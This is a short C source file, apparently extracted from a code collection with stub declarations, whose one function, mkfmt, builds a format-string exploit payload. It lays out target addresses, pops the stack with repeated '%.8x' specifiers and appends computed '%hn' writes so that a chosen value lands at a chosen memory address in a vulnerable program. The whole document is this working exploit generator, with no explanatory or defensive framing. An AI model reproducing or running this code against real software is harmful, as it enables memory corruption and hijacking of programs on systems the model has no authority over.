
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int errno ;
 int error (int,int ,char*) ;
 scalar_t__ malloc (int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int sprintf (char*,char*,unsigned int,unsigned int) ;
 int strcat (char*,char*) ;

char *mkfmt(int prebuf,
            int breakfast,
            unsigned long int location,
            unsigned long int value)
{
    char *buf;
    unsigned long int dest_addr[2];
    unsigned int precision[2];
    unsigned int small;
    unsigned int big;
    char *p;
    int i;

    buf = (char *) malloc(200);
    if (!buf) {
        error(1, errno, "failed to malloc");
    }

    big = value & 0x0000ffff;
    small = (value & 0xffff0000) >> 16;

    if (big < small) {
        big ^= small; small ^= big; big ^= small;
        dest_addr[0] = location;
        dest_addr[1] = location +2;
    }
    else {
        dest_addr[0] = location +2;
        dest_addr[1] = location;
    }

    p = buf;
    memset(p, 0x03, prebuf);
    p += prebuf;
    memcpy(p, "\x01\x01\x01\x01", 4);
    p += 4;
    memcpy(p, (char *)&dest_addr[0], 4);
    p += 4;
    memcpy(p, "\x01\x01\x01\x01", 4);
    p += 4;
    memcpy(p, (char *)&dest_addr[1], 4);
    p += 4;

    for (i=0; i < breakfast; i++){
        memcpy(p, "%.8x", 4);
        p += 4;
    }



    precision[0] = small - (8 * breakfast + 16 + prebuf + 30);
    precision[1] = big - small;
    sprintf(p, "%%.%dx%%hn%%.%dx%%hn", precision[0], precision[1]);


    return buf;

}
